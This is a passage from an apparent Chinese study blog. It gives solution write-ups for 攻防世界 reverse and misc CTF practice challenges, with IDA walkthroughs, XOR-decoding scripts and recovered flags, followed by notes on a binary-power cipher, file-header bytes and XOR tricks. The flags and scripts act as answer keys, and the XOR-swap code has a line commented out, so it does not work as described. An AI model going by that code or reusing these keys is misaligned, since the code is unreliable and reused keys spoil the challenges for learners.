<p>脚本：<br>s =’rxusoCqxw{yqK<code>&#123;KZqag&#123;r</code>i’<br>for i in range(len(s)):<br>    print (chr(ord(s[i])^0x14),end = ‘’)<br>运行得到flag{Welcome_to_Neusoft}</p>
<h2 id="9-xxxorrr"><a href="#9-xxxorrr" class="headerlink" title="9.xxxorrr"></a>9.xxxorrr</h2><p>拖入exe<br><img src="https://img-blog.csdnimg.cn/26dbb8640ecd4345b97323599060eeec.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA，找到main函数<br><img src="https://img-blog.csdnimg.cn/4f07939d7e5447b492a8df6336254b96.png" alt="在这里插入图片描述"></p>
<p>双击跟进sub_916<br><img src="https://img-blog.csdnimg.cn/7d2da8e6505b40eeb659a1e151a3e628.png" alt="在这里插入图片描述"></p>
<p>这里将s1和s2对比，相同就正确，所以s1应该就是flag加密后的字符串<br>unsigned __int64 sub_84A()<br>{<br>  int i; // [rsp+Ch] [rbp-14h]<br>  unsigned __int64 v2; // [rsp+18h] [rbp-8h]</p>
<p>  v2 = __readfsqword(0x28u);<br>  for ( i = 0; i &lt;= 33; ++i )<br>    s1[i] ^= 2 * i + 65;<br>  return __readfsqword(0x28u) ^ v2;<br>}<br>这是加密s1的函数，看到进行了一次异或<br>函数整体分析，函数先将输入的s与s1进行异或得到新s1，新s1经过sub_84A()函数加密后得到的s1与s2相同<br>解题思路：将s2与s1异或得到s1异或前的元素，通过加密函数逆向推出正确的flag<br>脚本：<br>s2=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46,<br>  0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C,<br>  0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43,<br>  0x2B, 0x26, 0x89, 0xFE, 0x00]<br>s1 = ‘qasxcytgsasxcvrefghnrfghnjedfgbhn’<br>flag=’’<br>for i in range(33):<br>     flag+=chr(ord(s1[i])^ (2 * i + 65)^s2[i])<br>print(flag)<br>运行得到 flag{c0n5truct0r5_functi0n_in_41f}</p>
<h2 id="10-bad-python"><a href="#10-bad-python" class="headerlink" title="10.bad_python"></a>10.bad_python</h2><p>(5条消息) 攻防世界Reverse简单难度bad_python题解_pyc 文件头_shenkong_的博客-CSDN博客</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>寒假刷题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假刷题记录reverse2</title>
    <url>/2023/02/23/%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse2/</url>
    <content><![CDATA[<p>攻防世界<br>Reverse</p>
<h2 id="1-Hello-CTF"><a href="#1-Hello-CTF" class="headerlink" title="1.Hello,CTF"></a>1.Hello,CTF</h2><p>拖入exe<br><img src="https://img-blog.csdnimg.cn/b457cb91e5a34c5ab9b32fdfc9a2e69d.png" alt="在这里插入图片描述"></p>
<p>无壳，拖入32位IDA<br>发现输入字符串大于17，程序结束0x11 = 17<br>小于17，则v10与v13比较，相同则输出：aSuccess<br>而v13一定大于17 ，v13=437261636b4d654a757374466f7246756e<br>进制转换，发现每位都在1-9 a-f之内，猜测为16位，转换如图<br><img src="https://img-blog.csdnimg.cn/2f43c3233bd44e0d96b42f7aaa388cf9.png" alt="在这里插入图片描述"></p>
<p>而题目描述为菜鸡发现Flag似乎并不一定是明文比较的<br>得到flag为CrackMeJustForFun</p>
<h2 id="2-re1"><a href="#2-re1" class="headerlink" title="2.re1"></a>2.re1</h2><p>拖入exe无壳，拖入32位IDA，找到main函数F5反汇编<br><img src="https://img-blog.csdnimg.cn/90ee01aa53454ba5a9a9a31f441a0421.png" alt="在这里插入图片描述"></p>
<p>看到有个strcmp函数，比较v5和v9,然后判断v3，根据v3给出相应的结果<br>双击跟进aFlagGet,证明思路正确<br>跟进xmmword_413E34<br><img src="https://img-blog.csdnimg.cn/d031e944ec5e46489bc9e532c9ce7eb0.png" alt="在这里插入图片描述"></p>
<p>xmmword的值已经出来了：那么v5的值就是3074656D30633165577B465443545544h了<br>v5应该是16进制表示的，看下strcmp函数，有个将v5转换为字符串的函数<br>找到在线16进制转换字符串<br><img src="https://img-blog.csdnimg.cn/4d4f001409f849949007daca55590259.png" alt="在这里插入图片描述"></p>
<p>通过文字倒序得到DUCTF{We1c0met0<br>发现flag并不完整，想到题干<br><img src="https://img-blog.csdnimg.cn/4d1dee139f08426c957feb7e1c8649a9.png" alt="在这里插入图片描述"></p>
<p>故猜测flag为DUCTF{We1c0met0DUCTF}</p>
<h2 id="3-logmein"><a href="#3-logmein" class="headerlink" title="3.logmein"></a>3.logmein</h2><p>拖入exe，无壳，拖入64位IDA,找到main函数，F5反汇编<br><img src="https://img-blog.csdnimg.cn/f9996af416644f7d87afd3da426b9ee3.png" alt="在这里插入图片描述"></p>
<p>__isoc99_scanf(“%32s”, s);<br>这一行代码就是我们输入的flag<br>将我们输入的flag的每一位与v7[i%v6]^v8[i]比较，如果有任意一位不相等，则输出“Incorrect password!”<br>把v7转换成字符型，IDA上直接显示的是<br>v7 = ‘ebmarah’;<br>需要注意的是，x86系列的CPU都是以小端序储存数据的，即低位字节存入低地址，高位字节存入高地址，所以正确的字符串应该反过来，即<br>v7=’harambe’;<br>脚本：</p>
<pre><code class="hljs python">v7 = <span class="hljs-string">&#x27;harambe&#x27;</span>
v8 = <span class="hljs-string">&#x27;:\&quot;AL_RT^L*.?+6/46&#x27;</span>
flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):
    c = <span class="hljs-built_in">ord</span>(v7[i % <span class="hljs-number">7</span>]) ^ <span class="hljs-built_in">ord</span>(v8[i])
    flag += <span class="hljs-built_in">chr</span>(c)
   
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>得到flag为RC3-2016-XORISGUD</p>
<h2 id="4-Getit"><a href="#4-Getit" class="headerlink" title="4.Getit"></a>4.Getit</h2><p>拖入exe，无壳，拖入64位IDA<br><img src="https://img-blog.csdnimg.cn/bbe9df77a66d4ceb815af03c0d1615d2.png" alt="在这里插入图片描述"></p>
<p>双击跟进p[j]<br><img src="https://img-blog.csdnimg.cn/0303d3763ff34353a7800c9da436f80f.png" alt="在这里插入图片描述"></p>
<p>可以看到p[i]数组存放的是无序的整数，也就是说每次在/tmp/flag.txt文件中写入的flag是不按顺序写的，且每次只出现一个字符，需要自己排序。<br>双击跟进t<br><img src="https://img-blog.csdnimg.cn/184c2a3216064ead8d4537f695bd67eb.png" alt="在这里插入图片描述"></p>
<p>发现harifCTF{????????????????????????????????}<br>53h转换成字符串为‘S’<br>脚本：</p>
<pre><code class="hljs python">key1=<span class="hljs-string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>
v5=<span class="hljs-number">0</span>
flag=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">while</span> v5 &lt; <span class="hljs-built_in">len</span>(key1):
   <span class="hljs-keyword">if</span> v5 &amp; <span class="hljs-number">1</span>:
      v3=<span class="hljs-number">1</span>
   <span class="hljs-keyword">else</span>:
      v3=-<span class="hljs-number">1</span>
   flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key1[v5])+v3)
   v5+=<span class="hljs-number">1</span>
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>运行得到b70c59275fcfa8aebf2d5911223c6589<br>所以flag为SharifCTF{b70c59275fcfa8aebf2d5911223c6589}<br>看到的其他解法：<br>法二：GDB动态调试<br>首先我们知道了下面strlen(&amp;t)的t是flag程序运行后生成的flag,那我们把鼠标放在那一行上看一下下面的反汇编行数，如下所示是400824，那么我们在反汇编窗口跟上。<br><img src="https://img-blog.csdnimg.cn/4d86d12ccaaa46968f01ebbe30022052.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c0e9978a0508437ab0133ce9b1eca495.png" alt="在这里插入图片描述"></p>
<p>可以看到反汇编中400824行的确是_strlen函数，而它上面就是把&amp;t移入了edi，所以在GDB中我们断点400824，然后查看edi寄存器即可。<br>所需命令：</p>
<pre><code class="hljs bash">b *0x400824
r</code></pre>
<p>这里用的是hyperpwn插件：<br><img src="https://img-blog.csdnimg.cn/70ca37c51c9a424eadcdd324b559ac52.png" alt="在这里插入图片描述"></p>
<p>可以看到flag就在RDI寄存器里<br>法三：C语言脚本</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span>(disable:4996)</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;
    <span class="hljs-type">char</span> v3;
    __int64 v5;
    <span class="hljs-type">char</span> s[] = <span class="hljs-string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;
    <span class="hljs-type">char</span> t[] = <span class="hljs-string">&quot;SharifCTF&#123;????????????????????????????????&#125;&quot;</span>;

    v5 = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (v5 &lt; <span class="hljs-built_in">strlen</span>(s)) &#123;
        <span class="hljs-keyword">if</span> (v5 &amp; <span class="hljs-number">1</span>)
            v3 = <span class="hljs-number">1</span>;
        <span class="hljs-keyword">else</span>
            v3 = <span class="hljs-number">-1</span>;
        *(t + v5 + <span class="hljs-number">10</span>) = s[v5] + v3;
        v5++;
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, t);

    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>法四：在IDA动态截停<br><img src="https://img-blog.csdnimg.cn/0e7b0af0d5b046ee9ddd551986b5322d.png" alt="在这里插入图片描述"></p>
<h2 id="5-no-strings-attached"><a href="#5-no-strings-attached" class="headerlink" title="5.no-strings-attached"></a>5.no-strings-attached</h2><p>拖入exe，无壳，拖入32位IDA<br>找到main函数，F5反汇编<br><img src="https://img-blog.csdnimg.cn/c2436ac16dc84454b28f8c4e081c281f.png" alt="在这里插入图片描述"></p>
<p>双击跟进authenticate()函数，分析如下</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">authenticate</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
  <span class="hljs-type">wchar_t</span> ws[<span class="hljs-number">8192</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-800Ch]</span>
  <span class="hljs-type">wchar_t</span> *s2; <span class="hljs-comment">// [esp+801Ch] [ebp-Ch]</span>

  s2 = (<span class="hljs-type">wchar_t</span> *)<span class="hljs-built_in">decrypt</span>(&amp;s, &amp;dword_8048A90); <span class="hljs-comment">//decrypt表示加密</span>
  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">fgetws</span>(ws, <span class="hljs-number">0x2000</span>, stdin) ) <span class="hljs-comment">//进行输入</span>
  &#123;
    ws[<span class="hljs-built_in">wcslen</span>(ws) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">wcscmp</span>(ws, s2) ) <span class="hljs-comment">//判断输入的ws是否等于加密过后的s2</span>
      <span class="hljs-built_in">wprintf</span>((<span class="hljs-type">int</span>)&amp;unk_8048B44); <span class="hljs-comment">//如果ws=s2，得到unk_8048B44，跟进得到success！</span>
    <span class="hljs-keyword">else</span>
      <span class="hljs-built_in">wprintf</span>((<span class="hljs-type">int</span>)&amp;unk_8048BA4);
  &#125;
  <span class="hljs-built_in">free</span>(s2);
&#125;</code></pre>
<p>当 ws 和 s2 相等时，会输出正确结果，那么s2就是flag，而s2经过了decrypt()加密。<br>那么跟进decrypt()函数：<br><img src="https://img-blog.csdnimg.cn/f125d44d7f9c4b60bd4f01bddd91c928.png" alt="在这里插入图片描述"></p>
<p>它先把参数 s 复制给 dest，与就是s=dest，然后把 dest 的每个值减去 a2 的值，然后再返回加密后的 dest。那么，我们就把s与a2找出来，相减就得到flag。<br>双击跟进s<br><img src="https://img-blog.csdnimg.cn/a47ebc5f861b4604a5041997032333a1.png" alt="在这里插入图片描述"></p>
<p>选中按shift+e提取出来<br><img src="https://img-blog.csdnimg.cn/5052a2a23fe444b481c02e776fe30693.png" alt="在这里插入图片描述"></p>
<p>根据得到的信息写c脚本：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-type">int</span> x=<span class="hljs-number">0</span>,i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> s[] =
    &#123;
      <span class="hljs-number">58</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,  <span class="hljs-number">54</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,  <span class="hljs-number">59</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">128</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">122</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,  <span class="hljs-number">99</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">102</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">115</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">103</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,  <span class="hljs-number">98</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">101</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">115</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
      <span class="hljs-number">96</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">107</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">115</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">112</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">100</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">110</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">112</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">112</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">100</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">112</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">100</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">110</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">123</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">118</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
     <span class="hljs-number">115</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">123</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>, <span class="hljs-number">128</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
    &#125;;
    <span class="hljs-type">int</span> b[] =
    &#123;
       <span class="hljs-number">1</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,  <span class="hljs-number">20</span>,
       <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,
    &#125;;
    <span class="hljs-keyword">while</span>(i &lt; <span class="hljs-number">152</span>)
    &#123;

       x = s[i ++] - b[j ++ % <span class="hljs-number">20</span>];
       <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">32</span>)
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,x);

    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/3c3255adc03e48c1874633d7327b7a99.png" alt="在这里插入图片描述"><br>得到flag为9447{you_are_an_international_mystery}<br>python脚本为：</p>
<pre><code class="hljs python">s = [<span class="hljs-number">5178</span>, <span class="hljs-number">5174</span>, <span class="hljs-number">5175</span>, <span class="hljs-number">5179</span>, <span class="hljs-number">5248</span>, <span class="hljs-number">5242</span>, <span class="hljs-number">5233</span>, <span class="hljs-number">5240</span>, <span class="hljs-number">5219</span>, <span class="hljs-number">5222</span>, <span class="hljs-number">5235</span>, <span class="hljs-number">5223</span>, <span class="hljs-number">5218</span>, <span class="hljs-number">5221</span>, <span class="hljs-number">5235</span>, <span class="hljs-number">5216</span>, <span class="hljs-number">5227</span>, <span class="hljs-number">5233</span>, <span class="hljs-number">5240</span>, <span class="hljs-number">5226</span>, <span class="hljs-number">5235</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">5220</span>, <span class="hljs-number">5240</span>, <span class="hljs-number">5230</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">5220</span>, <span class="hljs-number">5232</span>, <span class="hljs-number">5220</span>, <span class="hljs-number">5230</span>, <span class="hljs-number">5243</span>, <span class="hljs-number">5238</span>, <span class="hljs-number">5240</span>, <span class="hljs-number">5226</span>, <span class="hljs-number">5235</span>, <span class="hljs-number">5243</span>, <span class="hljs-number">5248</span>]
a = [<span class="hljs-number">5121</span>, <span class="hljs-number">5122</span>, <span class="hljs-number">5123</span>, <span class="hljs-number">5124</span>, <span class="hljs-number">5125</span>]
v6 = <span class="hljs-built_in">len</span>(s)
v7 = <span class="hljs-built_in">len</span>(a )
v2 = <span class="hljs-built_in">len</span>(s)

v4=<span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> v4&lt;v6:
    
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):
        <span class="hljs-keyword">if</span>(i&lt;v7 <span class="hljs-keyword">and</span> v4&lt;v6):
            s[v4]-=a[i]
            v4 += <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">break</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">38</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(s[i]),end=<span class="hljs-string">&quot;&quot;</span>)</code></pre>

]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>寒假刷题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假刷题记录misc</title>
    <url>/2023/02/23/%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95misc/</url>
    <content><![CDATA[<p>攻防世界<br>Misc</p>
<h2 id="1-2017-Dating-in-Singapore"><a href="#1-2017-Dating-in-Singapore" class="headerlink" title="1.2017_Dating_in_Singapore"></a>1.2017_Dating_in_Singapore</h2><p>手动格式化一下得到<br><img src="https://img-blog.csdnimg.cn/40918f9697684313869e28c2399f5bc9.png" alt="在这里插入图片描述"></p>
<p>每行长度分别为<br>26位<br>18位<br>16位<br>26位<br>14位<br>16位<br>16位<br>22位<br>20位<br>22位<br>18位<br>14位<br>通过分隔符可以分12行，都是十进制数<br>2位分隔得到<br><img src="https://img-blog.csdnimg.cn/6dcbef4b8b924e32876336282c267a76.png" alt="在这里插入图片描述"></p>
<p>在假设按每一行顺序对应每一个月份的情况下，每一个数字对应日期便可以得到<br><img src="https://img-blog.csdnimg.cn/3c534954721545ffb058b934d1f18a06.png" alt="在这里插入图片描述"></p>
<p>得到flag为HTIB{CTFFUN}</p>
<h2 id="2-Training-Stegano-1"><a href="#2-Training-Stegano-1" class="headerlink" title="2.Training-Stegano-1"></a>2.Training-Stegano-1</h2><p>拖入010<br><img src="https://img-blog.csdnimg.cn/eb30b503405741c5abc5e408e37dd35b.png" alt="在这里插入图片描述"></p>
<p>得到flag为steganol</p>
<h2 id="3-can-has-stdio"><a href="#3-can-has-stdio" class="headerlink" title="3.can_has_stdio?"></a>3.can_has_stdio?</h2><p>用记事本打开<br>了解到这是brainfuck语言<br>在线解密CTF在线工具-在线Brainfuck加密|在线Brainfuck解密|Brainfuck|Brainfuck原理|Brainfuck算法 (hiencode.com)<br><img src="https://img-blog.csdnimg.cn/8c14acb057454d59a5ed9bdd1c4374db.png" alt="在这里插入图片描述"></p>
<p>得到flag{esolangs_for_fun_and_profit}</p>
<h2 id="4-Test-flag-please-ignore"><a href="#4-Test-flag-please-ignore" class="headerlink" title="4.Test-flag-please-ignore"></a>4.Test-flag-please-ignore</h2><p>用记事本打开得到：<br>666c61677b68656c6c6f5f776f726c647d<br>在线16进制转字符串<a href="http://www.bejson.com/convert/ox2str/">http://www.bejson.com/convert/ox2str/</a><br>得到flag{hello_world}</p>
<h2 id="5-reversemMe"><a href="#5-reversemMe" class="headerlink" title="5.reversemMe"></a>5.reversemMe</h2><p>打开发现是一张镜像的flag<br>因为没有photoshop,所以直接看的<br>得到flag{4f7548f93c7bef1dc6a0542cf04e796e}</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>寒假刷题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>幂数加密</title>
    <url>/2023/02/27/%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="二进制幂数加密法"><a href="#二进制幂数加密法" class="headerlink" title="二进制幂数加密法"></a>二进制幂数加密法</h2><h6 id="何为幂数加密"><a href="#何为幂数加密" class="headerlink" title="何为幂数加密"></a>何为幂数加密</h6><p>二进制幂数加密通过二进制的几次方表示字母的序号来对信息加密。由二进制转换成十进制的时候，还可以表示成2的N次方的形式。由于英文字母只有26个字母。只要2的0、1、2、3、4、5次幂就可以表示31个单元。通过用二进制幂数表示字母序号数来加密。<br>例如<br>明文： d o n o t p u l l a l l y o u r e g g s i n o n e b a s k e t<br>字母序号：4 15 14 15 20 16 21 12 12 1 12 12 25 15 21 18 5 7 7 19 9 14 15 14 5 2 1 19 11 5 20<br>由于4=2^2 所以D加密过之后是2；15=2^0+2^1+2^2+2^3所以O加密后是0123。同理得到上述明文的加密后的密文<br>密文：2 0123/123 0123 24/4 024 23 23/0 23 23/034 0123 024 14/02 012 012 014/03 123 /0123 123 02/1 0 014 013 02 24<br>空格表示字母的间隔，“/”表示单词的间隔</p>
<h4 id="二进制幂数加密转换表"><a href="#二进制幂数加密转换表" class="headerlink" title="二进制幂数加密转换表"></a>二进制幂数加密转换表</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>A 1——0</td>
<td>N 14——123</td>
</tr>
<tr>
<td>B 2——1</td>
<td>O 15——0123</td>
</tr>
<tr>
<td>C 3——01</td>
<td>P 16——4</td>
</tr>
<tr>
<td>D 4——2</td>
<td>Q 17——04</td>
</tr>
<tr>
<td>E 5——02</td>
<td>R 18——14</td>
</tr>
<tr>
<td>F 6——12</td>
<td>S 19—–014</td>
</tr>
<tr>
<td>G 7——012</td>
<td>T 20—–24</td>
</tr>
<tr>
<td>H 8——3</td>
<td>U 21—–024</td>
</tr>
<tr>
<td>I 9——03</td>
<td>V 22—–124</td>
</tr>
<tr>
<td>J 10—–13</td>
<td>W 23—–0124</td>
</tr>
<tr>
<td>K 11—–013</td>
<td>X 24——34</td>
</tr>
<tr>
<td>L 12—–23</td>
<td>Y 25—–034</td>
</tr>
<tr>
<td>M 13—-023</td>
<td>Z 26—–134</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>常见文件头</title>
    <url>/2023/02/23/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    <content><![CDATA[<p>常见文件头：<br>文件类型：             文件头信息：                                    文件尾信息：<br>JPEG (jpg)             FFD8FFE0或FFD8FFE1或FFD8FFE8                    FF<br>PNG (png)             89 50 4E 47                                        00 3B<br>pdf                     25 50 44 46 2D 31 2E<br>Windows Password (pwl) E3 82 85 96<br>RAR                     52 61 72 21<br>ZIP Archive (zip)         50 4B 03 04                                        50 4B<br>压缩包                 PK<br>Word/Excel (xls.or.doc)     D0 CF 11 E0<br>HTML (html)             68 74 6D 6C 3E<br>MIDI (mid)              4D 54 68 64<br>7z                       37 7A BC AF 27 1C<br>GIF                       47 49 46 38 39 61<br>bmp                       42 4D 76 68</p>
]]></content>
  </entry>
  <entry>
    <title>异或算法</title>
    <url>/2023/02/23/%E5%BC%82%E6%88%96%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>异或算法<br><strong>相同为0，不同为1</strong><br>异或的数学符号为”⊕”    在计算机中通常用”^”的符号表示   异或略称为XOR、EOR、EX-OR</p>
<p>用途：<br>1、交互两个数：a=5,b=10,用异或实现交换</p>
<p>程序代码：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">int</span> a=<span class="hljs-number">5</span>;
   <span class="hljs-type">int</span> b=<span class="hljs-number">10</span>;
   a=a^b;
   b=a^b;
<span class="hljs-comment">//   a=a^b;</span>
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>,a,b);
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>2、因为电脑的数都是二进制的，所以可以转化二进制的位数和统计二进制中1或者0是奇数还是偶数。</p>
<p>（1):位反转<br>举例：10001000 在一些情况下，第四位和第五位需要反转，可以用10001000与00011000进行异或运算。<br>10001000 ^ 00011000 = 10010000<br>(2):统计某一位的奇偶数<br>将某个元素中的每一位逐步异或.<br>例如a1=1010，则b1=1 ^ 0 ^ 1 ^ 0 = 0，由此可以判断a中为1的位数是奇数还是偶数。<br>例如a2=10110，则b2=1 ^ 0 ^ 1 ^ 1 ^ 0 =1，由此可以判断a中为1的位数是奇数还是偶数。</p>
<p>3、找出序列中单个最小的数字：</p>
<p>程序代码：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
